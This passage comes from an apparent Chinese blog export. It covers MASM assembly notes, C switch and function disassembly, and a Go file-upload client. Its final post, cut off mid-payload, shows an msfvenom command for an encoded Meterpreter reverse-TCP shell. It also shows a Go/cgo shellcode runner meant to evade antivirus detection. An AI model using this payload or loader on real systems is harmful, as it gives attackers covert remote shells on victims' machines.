建立代码和数据分别用一个64KB段的.exe文件\nmedium | 代码段可以有多个64KB段，数据段只有一个64KB段\ncompact | 代码段只有一个64KB段，数据段可以有多个64KB段\nlarge  | 代码段和数据段都可以有多个64KB段\nhuge  | 同large，并且数据段中的一个数组也可以超过64KB\nflat     | Win32程序使用的模式，代码和数据使用同一个4GB段\n\n***对于Win32程序来说，只有一种内存模式，flat模式***\n\n## 源程序结构\n```asm\n.386\n.model flat,stdcall\noption casemap:none\n  \u003c一些include语句\u003e\n.stack [堆栈段的大小] ;常忽略不写\n.data\n  \u003c一些初始化过的变量定义\u003e\n.data?\n  \u003c一些没有初始化过的变量定义\u003e\n.const\n  \u003c一些常量定义\u003e\n.code\n  \u003c代码\u003e\n  \u003c开始标号\u003e\n      \u003c其他语句\u003e\n  end \u003c开始标号\u003e\n```\n\n## 局部变量的定义\n```asm\nlocal    变量名1[[重复数量]][:类型],变量名2[[重复数量]][:类型]......\n```\n\n*local伪指令必须紧接在子程序的伪指令proc后*\n\n**变量的类型**\n\n| 名称 | 表示方式 | 缩写 |\n|:-----|:---------|:-----|\n| 字节 | Byte | db |\n| 字 | word | dw |\n| 双字(doubleword) | dword | dd |\n| 三字(farword) | fword | df |\n| 四字(quadword) | qword | dq |\n| 十字节BCD码(tenbyte) | tbyte | dt |\n| 有符号字节(signbyte) | sbyte |  |\n| 有符号字(signword) | sword |  |\n| 有符号双字(signdword) | sdword |  |\n| 单精度浮点数 | Real4 |  |\n| 双精度浮点数 | Real8 |  |\n| 10字节浮点数 | Real10 |  |\n\n## 数据结构\n```asm\n结构名    struct\n\n字段1     类型    ?\n字段2     类型    ?\n......\n\n结构名    ends\n```\n\n**定义**\n```asm\n        .data?\n变量名称    结构名    \u003c字段1,字段2,...\u003e\n;或者\n        .data?\n变量名称    结构名    \u003c\u003e\n```\n\n**使用**\n```asm\n;前提假设结构名为WNDCLASS,结构体变量名为stWndClass,里面有字段lpfnWndProc\n\n;1\nmov    eax,stWndClass.lpfnWndProc\n\n;2.esi寄存器作指针寻址\nmov    esi,offset stWndClass\nmov    eax,[esi + WNDCLASS.lpfnWndProc]    ;注意这里是WNDCLASS\n\n;3.用assume伪指令把寄存器预先定义为结构指针\nmov    esi,offset stWndClass\nassume esi:ptr WNDCLASS\nmov    eax,[esi].lpfnWndProc\n...\nassume esi:nothing    ;注意：不使用esi做指针的时候需要用这句取消定义\n\n;4.结构的定义可以嵌套\nNEW_WNDCLASS    struct\n\ndwOption        word        ?\noldWndClass     WNDCLASS    \u003c\u003e\n\nNEW_WNDCLASS    ends\n\n;5.嵌套的引用\nmov    wax,[esi].oldWndClass.lpfnWndProc\n```\n\n## 以不同的类型访问变量\n```asm\n;以db定义一个缓冲区\nszBuffer    db    1024 dup (?)\n;mov    ax,szBuffer ;错误，masm中，如果要用制定类型之外的长度访问变量，必须显式指出要访问的长度，这样编译器忽略语法上的长度检验，仅使用变量的地址\n;类型 ptr 变量名\nmov    ax,word ptr szBuffer\nmov    eax,dword ptr szBuffer\n```\n\n## movzx\n把一个字节扩展到一个字或一个字或一个双字再放到ax或eax中，高位保持0而不是越界存取到其他的变量\n```asm\n    .data\nbTest1    db    12h\n    .code\nmovzx    ax,bTest1\nmovzx    eax,bTest1\n```\n\n## 变量的尺寸和数量\n```asm\nsizeof    变量名、数据类型或数据结构名 ;取得变量、数据类型或数据结构以字节为单位的长度\nlengthof  变量名、数据类型或数据结构名 ;取得变量中数据的项数\n```\n\n## 获取变量地址\n```asm\nmov    寄存器,offset 变量名    ;offset是取变量地址的伪操作符\nlea    eax,[ebp-4]            ;运行时按照ebp的值实际计算出地址放到eax中\n;invoke伪指令参数要用到一个局部变量的地址时，参数中不可能写入lea指令，用offset又是不对的，可用addr\naddr   局部变量名和全局变量名   ;全局变量名时编译器按照odffset的用法来用；局部变量名时，编译器用lea先把地址取到wax中，然后用eax代替变量地址使用\n;invoke中使用addr时，它的左边不能使用wax，否则eax的值会被覆盖\n```\n\n## 子程序的定义\n```asm\n子程序名 proc [距离][语言类型][可视区域][USES寄存器列表][,参数:类型]...[VARARG]\n        local 局部变量列表\n\n        指令\n\n子程序名 endp\n```\n\n## 参数传递和堆栈平衡\n**不同语言调用方式的差别**\n\n| | C | SysCall | StdCall | BASIC | FORTRAN | PASCAL |\n|:-----|:-----|:-----|:-----|:-----|:-----|:-----|\n| 最先入栈参数 | 右 | 右 | 右 | 左 | 左 | 左 |\n| 清除堆栈者 | 调用者 | 子程序 | 子程序 | 子程序 | 子程序 | 子程序 |\n| 允许使用VARARG | 是 | 是 | 是 | 否 | 否 | 否 |\n\n![](http://ww1.sinaimg.cn/large/c0264382gy1fjjg3l2dztj209w08f0ur.jpg)\n\n## 条件测试语句\n```asm\n寄存器或变量    操作符    操作数\n(表达式1) 逻辑运算符 (表达式2) 逻辑运算符 (表达式3) ...\n;举例，左边表达式，右边是表达式为真的条件\nx==3        ;x等于3\neax!=3      ;eax不等于3\n(y\u003e=3)\u0026\u0026ebx ;y大于等于3且ebx为非零值\n;表达式的左边只能是变量或寄存器，不能为常数；表达式两边不能同时为变量，但可以同时是寄存器\n```\n\n标志位的状态指示\n```\nCARRY?        表示Carry位是否置位\nOVERFLOW?     表示Overflow位是否置位\nPARITY?       表示Parity位是否置位\nSIGN?         表示Sign位是否置位\nZERO?         表示Zero位是否置位\n```\n\n## 分支语句\n```asm\n.if eax \u0026\u0026 (bx \u003e= dWX) || !(dWY != ecx)\n    mov    esi,1\n.elseif edx\n    mov    esi,2\n.elseif esi \u0026 1\n    mov    esi,3\n.elseif ZERO? \u0026\u0026 CARRY?\n    mov    esi,4\n.endif\n```\n\n## 循环语句\n```asm\n.while 条件测试表达式\n    指令\n    [.break [.if 退出条件]]\n    [.continue]\n.endw\n;或\n.repeat\n    指令\n    [.break [.if 退出条件]]\n    [.continue]\n    .until    条件测试表达式    (或 .untilcxz [条件测试表达式])\n```\n\n## 变量和函数的命名\n### 匈牙利表示法\n```\n类型前缀+变量说明（类型用小写字母，说明则用首字母大写的几个引文单词组成）\n```\n\n汇编语言中常用的类型前缀\n\n| | |\n|:-----|:-----|\n| b | 表示byte |\n| w | 表示word |\n| dw | 表示dword |\n| h | 表示句柄 |\n| lp | 表示指针 |\n| sz | 表示以0结尾的字符串 |\n| lpsz | 表示指向0结尾的字符串的指针 |\n| f | 表示浮点数 |\n| st | 表示一个数据结构 |\n\n举例\n\n| | |\n|:-----|:-----|\n| hWinMain | 主窗口的句柄 |\n| dwTimeCount | 时间计数器，以双字定义 |\n| szWelcome | 欢迎信息字符串，以0结尾 |\n| lpBuffer | 指向缓存区的指针 |\n| stWndClass | WNDCLASS结构 |\n\n**本书的作者建议**\n- 全局变量的定义使用标准的匈牙利表示法，在参数的前面加下划线；在局部变量的前面加@符号，这样引用的时候就能随时注意到变量的作用域。\n- 在内部子程序的名称前面加下划线，以便和系统API区别。\n\n举例\n```asm\n_Calc    proc    _dwX,_dwY\n         local   @dwResult\n\n         finit\n         fild    _dwX\n         fld     st(0)\n         fmul                ;i * i\n         fild    _dwY\n         fld     st(0)\n         fmul                ;j * j\n         fadd                ;i * i + j * j\n         fsqrt               ;sqrt(i * i + j * j)\n         fistp   @dwResult   ;put result\n         mov     eax,@dwResult\n         ret\n\n_calc    endp\n```\n","cover":"","link":"2017/09/14/windows环境下32位汇编语言程序设计笔记-基础篇.html","preview":"\u003ch2\u003e内存模式\u003c/h2\u003e\n\n\u003cpre\u003e\u003ccode class=\"language-asm\"\u003e\t\t.386\n\t\t.model flat,stdcall ;子程序调用模式，win32中只能用stdcall，因为win32api调用使用的这个\n\t\toption casemap:none ;定义了程序中变量和子程序名是否对大小写敏感，win32api名称区分大小写，所以只需要记住这个定式\n\u003c/code\u003e\u003c/pre\u003e\n","title":"Windows环境下32位汇编语言程序设计笔记-基础篇"},{"content":"\n\n\n在分支较多的时候，switch的效率比if高，在反汇编中我们即可看到效率高的原因\n\n\n## 0x01分支结构不超过3个\n```c\n#include \u003cstdio.h\u003e\n\nvoid main()\n{\n\tint x = 5;\n\tswitch(x)\n\t{\n\tcase 5:\n\t\tprintf(\"%d\\n\",x);\n\t\tbreak;\n\tcase 6:\n\t\tprintf(\"%d\\n\",x);\n\t\tbreak;\n\tcase 7:\n\t\tprintf(\"%d\\n\",x);\n\t\tbreak;\n\tdefault:\n\t\tbreak;\n\t}\n\n\treturn;\n}\n```\n```asm\n5:        int x = 5;\n00401028   mov         dword ptr [ebp-4],5\n6:        switch(x)\n7:        {\n0040102F   mov         eax,dword ptr [ebp-4]\n00401032   mov         dword ptr [ebp-8],eax         //x的值放入[ebp-8]\n00401035   cmp         dword ptr [ebp-8],5\n00401039   je          main+39h (00401049)           //x与5相等就跳转，下面6和7相同\n0040103B   cmp         dword ptr [ebp-8],6\n0040103F   je          main+4Ch (0040105c)\n00401041   cmp         dword ptr [ebp-8],7\n00401045   je          main+5Fh (0040106f)\n00401047   jmp         main+72h (00401082)\n8:        case 5:\n9:            printf(\"%d\\n\",x);\n00401049   mov         ecx,dword ptr [ebp-4]\n0040104C   push        ecx\n0040104D   push        offset string \"%d\\n\" (0042201c)\n00401052   call        printf (004010d0)\n00401057   add         esp,8\n10:           break;\n0040105A   jmp         main+83h (00401093)\n11:       case 6:\n12:           printf(\"%d\\n\",x);\n0040105C   mov         edx,dword ptr [ebp-4]\n0040105F   push        edx\n00401060   push        offset string \"%d\\n\" (0042201c)\n00401065   call        printf (004010d0)\n0040106A   add         esp,8\n13:           break;\n0040106D   jmp         main+83h (00401093)\n14:       case 7:\n15:           printf(\"%d\\n\",x);\n0040106F   mov         eax,dword ptr [ebp-4]\n00401072   push        eax\n00401073   push        offset string \"%d\\n\" (0042201c)\n00401078   call        printf (004010d0)\n0040107D   add         esp,8\n16:           break;\n00401080   jmp         main+83h (00401093)\n17:       default:\n18:           printf(\"%d\\n\",x);\n00401082   mov         ecx,dword ptr [ebp-4]\n00401085   push        ecx\n00401086   push        offset string \"%d\\n\" (0042201c)\n0040108B   call        printf (004010d0)\n00401090   add         esp,8\n19:           break;\n20:       }\n```\n\n## 0x02分支数超过3且分支存在线性关系\n```c\n#include \u003cstdio.h\u003e\n\nvoid main()\n{\n\tint x = 5;\n\tswitch(x)\n\t{\n\tcase 5:\n\t\tprintf(\"%d\\n\",x);\n\t\tbreak;\n\tcase 6:\n\t\tprintf(\"%d\\n\",x);\n\t\tbreak;\n\tcase 7:\n\t\tprintf(\"%d\\n\",x);\n\t\tbreak;\n\tcase 8:\n\t\tprintf(\"%d\\n\",x);\n\t\tbreak;\n\tcase 9:\n\t\tprintf(\"%d\\n\",x);\n\t\tbreak;\n\tdefault:\n\t\tprintf(\"%d\\n\",x);\n\t\tbreak;\n\t}\n\n\treturn;\n}\n```\n```asm\n5:        int x = 5;\n0040D778   mov         dword ptr [ebp-4],5\n6:        switch(x)\n7:        {\n0040D77F   mov         eax,dword ptr [ebp-4]\n0040D782   mov         dword ptr [ebp-8],eax\n0040D785   mov         ecx,dword ptr [ebp-8]\n0040D788   sub         ecx,5                              //x减去分支中的最小值5，方便构建跳转表\n0040D78B   mov         dword ptr [ebp-8],ecx\n0040D78E   cmp         dword ptr [ebp-8],4                \n0040D792   ja          $L537+13h (0040d7fd)               //x-5\u003e4跳转到default，即x\u003e9跳转\n0040D794   mov         edx,dword ptr [ebp-8]              //edx=x-5\n0040D797   jmp         dword ptr [edx*4+40D81Fh]          //构建跳转表，根据edx的值从对应地址取出值(各个分支的地址)，40D81F为跳转表起始地址\n8:        case 5:\n9:            printf(\"%d\\n\",x);\n0040D79E   mov         eax,dword ptr [ebp-4]\n0040D7A1   push        eax\n0040D7A2   push        offset string \"%d\\n\" (0042201c)\n0040D7A7   call        printf (004010d0)\n0040D7AC   add         esp,8\n10:           break;\n0040D7AF   jmp         $L537+24h (0040d80e)\n11:       case 6:\n12:           printf(\"%d\\n\",x);\n0040D7B1   mov         ecx,dword ptr [ebp-4]\n0040D7B4   push        ecx\n0040D7B5   push        offset string \"%d\\n\" (0042201c)\n0040D7BA   call        printf (004010d0)\n0040D7BF   add         esp,8\n13:           break;\n0040D7C2   jmp         $L537+24h (0040d80e)\n14:       case 7:\n15:           printf(\"%d\\n\",x);\n0040D7C4   mov         edx,dword ptr [ebp-4]\n0040D7C7   push        edx\n0040D7C8   push        offset string \"%d\\n\" (0042201c)\n0040D7CD   call        printf (004010d0)\n0040D7D2   add         esp,8\n16:           break;\n0040D7D5   jmp         $L537+24h (0040d80e)\n17:       case 8:\n18:           printf(\"%d\\n\",x);\n0040D7D7   mov         eax,dword ptr [ebp-4]\n0040D7DA   push        eax\n0040D7DB   push        offset string \"%d\\n\" (0042201c)\n0040D7E0   call        printf (004010d0)\n0040D7E5   add         esp,8\n19:           break;\n0040D7E8   jmp         $L537+24h (0040d80e)\n20:       case 9:\n21:           printf(\"%d\\n\",x);\n0040D7EA   mov         ecx,dword ptr [ebp-4]\n0040D7ED   push        ecx\n0040D7EE   push        offset string \"%d\\n\" (0042201c)\n0040D7F3   call        printf (004010d0)\n0040D7F8   add         esp,8\n22:           break;\n0040D7FB   jmp         $L537+24h (0040d80e)\n23:       default:\n24:           printf(\"%d\\n\",x);\n0040D7FD   mov         edx,dword ptr [ebp-4]\n0040D800   push        edx\n0040D801   push        offset string \"%d\\n\" (0042201c)\n0040D806   call        printf (004010d0)\n0040D80B   add         esp,8\n25:           break;\n26:       }\n\n```\n跳转表从[edx*4+40D81Fh]取出分支的地址值然后进行jmp，下表是跳转表部分\n```\n0040D81F  9E D7 40 00  ..@.\n0040D823  B1 D7 40 00  ..@.\n0040D827  C4 D7 40 00  ..@.\n0040D82B  D7 D7 40 00  ..@.\n0040D82F  EA D7 40 00  ..@.\n```\n\n## 0x03分支跃度大难以构成跳转表的分支结构\n```c\n#include \u003cstdio.h\u003e\n\nvoid main()\n{\n\tint x = 5;\n\tswitch(x)\n\t{\n\tcase 5:\n\t\tprintf(\"%d\\n\",x);\n\t\tbreak;\n\tcase 6:\n\t\tprintf(\"%d\\n\",x);\n\t\tbreak;\n\tcase 7:\n\t\tprintf(\"%d\\n\",x);\n\t\tbreak;\n\tcase 8:\n\t\tprintf(\"%d\\n\",x);\n\t\tbreak;\n\tcase 100:\n\t\tprintf(\"%d\\n\",x);\n\t\tbreak;\n\tdefault:\n\t\tprintf(\"%d\\n\",x);\n\t\tbreak;\n\t}\n\n\treturn;\n}\n```\n```asm\n5:        int x = 5;\n00401028   mov         dword ptr [ebp-4],5\n6:        switch(x)\n7:        {\n0040102F   mov         eax,dword ptr [ebp-4]\n00401032   mov         dword ptr [ebp-8],eax\n00401035   mov         ecx,dword ptr [ebp-8]\n00401038   sub         ecx,5\n0040103B   mov         dword ptr [ebp-8],ecx\n0040103E   cmp         dword ptr [ebp-8],5Fh\n00401042   ja          $L536+13h (004010b5)               //具体参见上一种,x大于100跳转到default\n00401044   mov         eax,dword ptr [ebp-8]              //edx=x-5\n00401047   xor         edx,edx                            //edx置零\n00401049   mov         dl,byte ptr  (004010ef)[eax]       //查询索引表并将取出来的值放入DL(在od里面的这条反汇编更清楚)\n0040104F   jmp         dword ptr [edx*4+4010D7h]          //根据DL(EDX)的值查跳转表\n8:        case 5:\n9:            printf(\"%d\\n\",x);\n00401056   mov         ecx,dword ptr [ebp-4]\n00401059   push        ecx\n0040105A   push        offset string \"%d\\n\" (0042201c)\n0040105F   call        printf (004011a0)\n00401064   add         esp,8\n10:           break;\n00401067   jmp         $L536+24h (004010c6)\n11:       case 6:\n12:           printf(\"%d\\n\",x);\n00401069   mov         edx,dword ptr [ebp-4]\n0040106C   push        edx\n0040106D   push        offset string \"%d\\n\" (0042201c)\n00401072   call        printf (004011a0)\n00401077   add         esp,8\n13:           break;\n0040107A   jmp         $L536+24h (004010c6)\n14:       case 7:\n15:           printf(\"%d\\n\",x);\n0040107C   mov         eax,dword ptr [ebp-4]\n0040107F   push        eax\n00401080   push        offset string \"%d\\n\" (0042201c)\n00401085   call        printf (004011a0)\n0040108A   add         esp,8\n16:           break;\n0040108D   jmp         $L536+24h (004010c6)\n17:       case 8:\n18:           printf(\"%d\\n\",x);\n0040108F   mov         ecx,dword ptr [ebp-4]\n00401092   push        ecx\n00401093   push        offset string \"%d\\n\" (0042201c)\n00401098   call        printf (004011a0)\n0040109D   add         esp,8\n19:           break;\n004010A0   jmp         $L536+24h (004010c6)\n20:       case 100:\n21:           printf(\"%d\\n\",x);\n004010A2   mov         edx,dword ptr [ebp-4]\n004010A5   push        edx\n004010A6   push        offset string \"%d\\n\" (0042201c)\n004010AB   call        printf (004011a0)\n004010B0   add         esp,8\n22:           break;\n004010B3   jmp         $L536+24h (004010c6)\n23:       default:\n24:           printf(\"%d\\n\",x);\n004010B5   mov         eax,dword ptr [ebp-4]\n004010B8   push        eax\n004010B9   push        offset string \"%d\\n\" (0042201c)\n004010BE   call        printf (004011a0)\n004010C3   add         esp,8\n25:           break;\n26:       }\n```\n索引表\n```\n004010F1  00 01 02 03 05 05 05 05  ........\n004010F9  05 05 05 05 05 05 05 05  ........\n00401101  05 05 05 05 05 05 05 05  ........\n00401109  05 05 05 05 05 05 05 05  ........\n00401111  05 05 05 05 05 05 05 05  ........\n00401119  05 05 05 05 05 05 05 05  ........\n00401121  05 05 05 05 05 05 05 05  ........\n00401129  05 05 05 05 05 05 05 05  ........\n00401131  05 05 05 05 05 05 05 05  ........\n00401139  05 05 05 05 05 05 05 05  ........\n00401141  05 05 05 05 05 05 05 05  ........\n00401149  05 05 05 05 05 05 05 04  ........\n```\n跳转表\n```\n004010D9  58 10 40 00  X.@.\n004010DD  6B 10 40 00  k.@.\n004010E1  7E 10 40 00  ~.@.\n004010E5  91 10 40 00  ..@.\n004010E9  A4 10 40 00  ..@.\n004010ED  B7 10 40 00  ..@.\n```\n","cover":"","link":"2017/09/07/switch反汇编-c语言.html","preview":"\u003cp\u003e在分支较多的时候，switch的效率比if高，在反汇编中我们即可看到效率高的原因\u003c/p\u003e\n","title":"switch反汇编(C语言)"},{"content":"\n\n\n## 0x01 环境\nxp+vc6.0\n\n## 0x02 代码\n```c\nint plus(int x, int y)\n{\n\treturn 0;\n}\n```\n\n以下是vc6.0的反汇编窗口\n```asm\n1:    int plus(int x, int y)\n2:    {\n00401020   push        ebp\n00401021   mov         ebp,esp\n00401023   sub         esp,40h\n00401026   push        ebx\n00401027   push        esi\n00401028   push        edi\n00401029   lea         edi,[ebp-40h]\n0040102C   mov         ecx,10h\n00401031   mov         eax,0CCCCCCCCh\n00401036   rep stos    dword ptr [edi]\n3:        return 0;\n00401038   xor         eax,eax\n4:    }\n0040103A   pop         edi\n0040103B   pop         esi\n0040103C   pop         ebx\n0040103D   mov         esp,ebp\n0040103F   pop         ebp\n00401040   ret\n```\n\n## 0x03 分析\n```\npush      ebp\nmov       ebp,esp\nsub       esp,40h\n//提升栈，为函数腾出空间，为ebp寻址做准备\npush      ebx\npush      esi\npush      edi\n//寄存器压栈，保存现场\nlea       edi,[ebp-40h]\n//将ebp-40h（esp）的具体内存地址存到edi\nmov       ecx,10h\n//10（十六进制）存入计数寄存器\nmov       eax,0xCCCCCCCC\n//初始化eax\nrep stos  dword ptr [edi]\n//用eax中的值初始化到es:[edi]指向的地址，长度为dword，循环执行次数为eax中的值（恰好ebp-\u003eesp全部被初始化）\nxor       eax,eax\n//eax清零\npop       edi\npop       esi\npop       ebx\nmov       esp,ebp\npop       ebp\nret\n//寄存器出栈，恢复现场，堆栈平衡并返回\n```\n","cover":"","link":"2017/09/06/最最简单的c语言函数汇编分析.html","preview":"\u003ch2\u003e0x01 环境\u003c/h2\u003e\n\n\u003cp\u003exp+vc6.0\u003c/p\u003e\n\n\u003ch2\u003e0x02 代码\u003c/h2\u003e\n\n\u003cpre\u003e\u003ccode class=\"language-c\"\u003eint plus(int x, int y)\n{\n\treturn 0;\n}\n\u003c/code\u003e\u003c/pre\u003e\n","title":"最最简单的c语言函数汇编分析"},{"content":"\n\n\n客户端通过multipart.Write把文件的文本流写入一个缓存中，然后调用http的Post方法把缓存传到服务器。\n\n```golang\npackage main\n\nimport (\n    \"bytes\"\n    \"fmt\"\n    \"io\"\n    \"io/ioutil\"\n    \"mime/multipart\"\n    \"net/http\"\n    \"os\"\n)\n\nfunc postFile(filename string, targetUrl string) error {\n    bodyBuf := \u0026bytes.Buffer{}\n    bodyWriter := multipart.NewWriter(bodyBuf)\n\n    //关键的一步操作\n    fileWriter, err := bodyWriter.CreateFormFile(\"uploadfile\", filename)\n    if err != nil {\n        fmt.Println(\"error writing to buffer\")\n        return err\n    }\n\n    //打开文件句柄操作\n    fh, err := os.Open(filename)\n    if err != nil {\n        fmt.Println(\"error opening file\")\n        return err\n    }\n    defer fh.Close()\n\n    //iocopy\n    _, err = io.Copy(fileWriter, fh)\n    if err != nil {\n        return err\n    }\n\n    contentType := bodyWriter.FormDataContentType()\n    bodyWriter.Close()\n\n    resp, err := http.Post(targetUrl, contentType, bodyBuf)\n    if err != nil {\n        return err\n    }\n    defer resp.Body.Close()\n    resp_body, err := ioutil.ReadAll(resp.Body)\n    if err != nil {\n        return err\n    }\n    fmt.Println(resp.Status)\n    fmt.Println(string(resp_body))\n    return nil\n}\n\n// sample usage\nfunc main() {\n    target_url := \"http://localhost/upload\"\n    filename := \"./example.pdf\"\n    postFile(filename, target_url)\n}\n```\n","cover":"","link":"2017/07/07/golang模拟客户端post表单功能文件上传.html","preview":"\u003cp\u003e客户端通过multipart.Write把文件的文本流写入一个缓存中，然后调用http的Post方法把缓存传到服务器。\u003c/p\u003e\n","title":"Golang模拟客户端POST表单功能文件上传"},{"content":"\n\n\n\nmsf是一个很强大的工具，我经常会在渗透用它来反弹shell，不过它生成的反弹后门会被不少杀软kill，这篇文章只是讲讲我在msf中一个简单的免杀小技巧\n\n## 思路\n我以前接触过一款python的远控，其实说是远控，基本也就是nc的功能加了一个服务端的web页面控制并加了一些其他的功能可以用来管理诸多客户机\n这款远控我下载下来用过，并用pyinstaller打包成了exe（缺点是体积太过庞大），惊奇的是，360不杀它，然后自己想着其他语言是不是也会这样，于是我用golang写了一个简易版nc反弹，编译之后，也是不查杀的。python和golang有一个共同点，就是可以用来内联C编程，所以C语言的shellcode按理说应该会达到同样的效果\n\n## 得到shellcode\n```bash\nmsfvenom -p windows/meterpreter/reverse_tcp LPORT=5555 LHOST=192.168.1.100 -e x86/shikata_ga_nai -i 11 -f py \u003e 1.py\n```\n建议是生成32位的，如果想生成64位也可以，`-e x86/shikata_ga_nai -i 11`是指用`x86/shikata_ga_nai`编码迭代11次，然后生成py文件\npy文件打开是shellcode，我们接下来对它进行一点小改造，对于python去执行shellcode的方法，相信小伙伴都已经不陌生，在《python灰帽子》中有讲解，我今天要使用的是golang，其实个人认为golang执行shellcode的代码是更简洁的\n\n## Golang环境搭建\n安装Golang32位（建议32位，与前面对应，在测试过程中，如果32位shellcode配合64位golang加32位gcc，就算把golang的GOARCH改为386也依旧会失败，建议一一对应），安装gcc32位（可以使用[TDM-GCC](http://tdm-gcc.tdragon.net/download)）\n\n## 代码编写\n```Golang\npackage main\n\n/*\nvoid call(char *code) {\n    int (*ret)() = (int(*)())code;\n    ret();\n}\n*/\nimport \"C\"\nimport \"unsafe\"\n\nfunc main() {\n    buf := \"\"\n    buf += \"\\xdd\\xc6\\xd9\\x74\\x24\\xf4\\x5f\\x33\\xc9\\xb8\\xb3\\x5e\\x2c\"\n    buf += \"\\xc9\\xb1\\x97\\x31\\x47\\x1a\\x03\\x47\\x1a\\x83\\xc7\\x04\\xe2\"\n    buf += \"\\x46\\x84\\xfd\\x72\\xee\\x0e\\xb5\\x96\\x37\\x04\\x6d\\x63\\x9f\"\n    buf += \"\\xcc\\xa4\\x3a\\x8e\\x8c\\xf7\\x39\\x81\\xca\\xe4\\x42\\xff\\xce\"\n    buf += \"\\xa3\\xa2\\xdb\\x06\\xc0\\x3f\\xaf\\x41\\x73\\xba\\xf7\\x20\\x13\"\n    buf += \"\\x98\\x8c\\xff\\xfa\\x0a\\xda\\x6e\\xf2\\x6d\\xc3\\x81\\x07\\xc0\"\n    buf += \"\\x1b\\x37\\xeb\\xa2\\xa9\\x32\\x71\\xaf\\xe9\\x20\\xd1\\xaa\\x9e\"\n    buf += \"\\xbd\\x82\\xf3\\x81\\x1f\\xab\\xbf\\xc4\\xd9\\x6c\\x75\\x37\\x3a\"\n    buf += \"\\x53\\x78\\x90\\x79\\xaf\\x93\\x1b\\xb3\\x15\\x09\\xe5\\x45\\x5c\"\n    buf += \"\\x26\\x0f\\x0d\\x16\\x52\\xf1\\x8a\\x7e\\x8b\\xc4\\x50\\x8e\\x0a\"\n    buf += \"\\x38\\x2f\\x2b\\x40\\x73\\x0b\\xf0\\x51\\x5f\\xc6\\xbf\\x04\\x47\"\n    buf += \"\\x80\\x36\\xe5\\x88\\x88\\xb3\\xfc\\xa0\\x52\\xfe\\x92\\x81\\x8d\"\n    buf += \"\\x89\\xf2\\x6a\\xcc\\x7f\\x9a\\xe9\\x1a\\x30\\x73\\xa3\\x63\\x42\"\n    buf += \"\\x10\\xe9\\xcf\\x62\\xe4\\x06\\x52\\xe1\\x8d\\x88\\xfe\\x52\\xc4\"\n    buf += \"\\xc3\\xed\\x7a\\x0e\\x66\\x5f\\x8c\\x2c\\xef\\xfa\\xbd\\x8c\\x79\"\n    buf += \"\\x6c\\x01\\xe3\\x5c\\xde\\xc4\\x8a\\x4c\\x7d\\x34\\x32\\xb5\\x23\"\n    buf += \"\\x56\\x6c\\x52\\x3f\\x15\\x26\\x6a\\xf8\\x6b\\x81\\x2c\\x23\\x8d\"\n    buf += \"\\x41\\x6e\\x24\\x30\\xc6\\xcb\\xba\\x26\\xd4\\x3b\\x37\\xd3\\xc6\"\n    buf += \"\\xa8\\x5a\\x16\\x8f\\x1e\\x27\\xca\\xcb\\xda\\x7f\\x74\\x62\\xb2\"\n    buf += \"\\x62\\xa6\\xb1\\xfc\\x64\\x53\\x3a\\xa7\\xa4\\x21\\x3d\\x79\\x08\"\n    buf += \"\\x06\\x74\\x2a\\xa2\\xe7\\x0d\\x68\\x16\\xa3\\x96\\xe5\\xad\\x32\"\n    buf += \"\\x10\\xa3\\x0f\\x49\\xc3\\x69\\xa7\\x5b\\x61\\x1a\\xf8\\x1d\\x9e\"\n    buf += \"\\x9b\\x3a\\x00\\xfc\\x18\\xc3\\x42\\x1a\\xd6\\x44\\x5d\\xfe\\xc5\"\n    buf += \"\\xb6\\x68\\xd2\\xad\\x24\\xda\\x74\\xa7\\xf3\\x66\\x9a\\x42\\x7a\"\n    buf += \"\\x50\\xf0\\x0b\\x47\\xbc\\xad\\x6c\\x1e\\xca\\xbe\\x90\\xca\\xc3\"\n    buf += \"\\x8e\\x5b\\xde\\x66\\xe2\\xb3\\x20\\x6f\\x38\\x17\\xc1\\xac\\xfb\"\n    buf += \"\\xd3\\x2f\\x91\\xa7\\xff\\x65\\xd7\\xd0\\x25\\x4c\\xd4\\xb3\\x35\"\n    buf += \"\\x38\\xa1\\x82\\xb8\\x23\\x42\\xe9\\xa5\\x95\\x8e\\xc4\\x35\\xca\"\n    buf += \"\\x92\\xfe\\xde\\x62\\x70\\xd6\\x7a\\x7f\\xfd\\xfb\\xf0\\x24\\xbd\"\n    buf += \"\\x5d\\x6d\\x3d\\x13\\xbc\\x1d\\x25\\x54\\x9d\\x0e\\x68\\xc8\\x9a\"\n    buf += \"\\x10\\x87\\xf0\\xc9\\xac\\x37\\x57\\x84\\x23\\x5f\\x8a\\xc0\\xab\"\n    buf += \"\\x52\\x6e\\xae\\x79\\xa2\\xdb\\xff\\xd8\\x41\\x28\\x8b\\xd3\\x9d\"\n    buf += \"\\x68\\x3c\\x55\\xf2\\xfe\\x0c\\x8a\\x38\\xdf\\xb3\\x80\\x9b\\x70\"\n    buf += \"\\x2b\\x4e\\xe1\\xfa\\x0b\\xfe\\xf5\\xc3\\x1a\\x0d\\x83\\xb0\\x69\"\n    buf += \"\\xd0\\x68\\xfb\\xe0\\xae\\xbd\\x56\\x52\\x17\\x9a\\xf8\\x8f\\xc0\"\n    buf += \"\\x14\\x8c\\xb0\\xf7\\x0e\\x87\\xfa\\x54\\xf4\\x04\\x4a\\x5a\\xc8\"\n    buf += \"\\x89\\x57\\x0e\\xbf\\x7a\\x76\\x9b\\xfe\\xb8\\x5f\\x31\\x42\\xec\"\n    buf += \"\\xaf\\x18\\x9e\\x3f\\xf0\\x09\\x79\\x86\\xb3\\x08\\x29\\x50\\xfd\"\n    buf += \"\\xc3\\x46\\x7d\\x24\\x51\\x5b\\xd0\\x81\\x19\\x6f\\xc2\\x2c\\x17\"\n    buf += \"\\xab\\xa3\\xb7\\xd9\\x6f\\x82\\xd9\\x37\\x5f\\x38\\x01\\xd8\\xfd\"\n    buf += \"\\xfd\\x11\\x22\\x61\\xd0\\x92\\x45\\x37\\x4f\\x6c\\x4e\\x91\\x3b\"\n    buf += \"\\x42\\x07\\xc5\\x77\\xdc\\x52\\xd6\\xc7\\x9d\\x7b\\x62\\xba\\x1c\"\n    buf += \"\\x62\\x3c\\xde\\xad\\x96\\x03\\x55\\xde\\x9d\\x52\\x5c\\x5d\\x0c\"\n    buf += \"\\x73\\x0e\\xc3\\x4c\\xae\\x7d\\x1c\\x7c\\x64\\xaf\\xbb\\xce\\xa6\"\n    buf += \"\\x02\\x0e\\xb1\\x51\\xc4\\x2d\\x1b\\x6b\\xb7\\x7c\\xd9\\x4b\\xc3\"\n    buf += \"\\x8c\\x43\\xd6\\x1b\\x2a\\x4f\\x5e\\x0a\\x9a\\xd5\\x4d\\x45\\x64\"\n    buf += 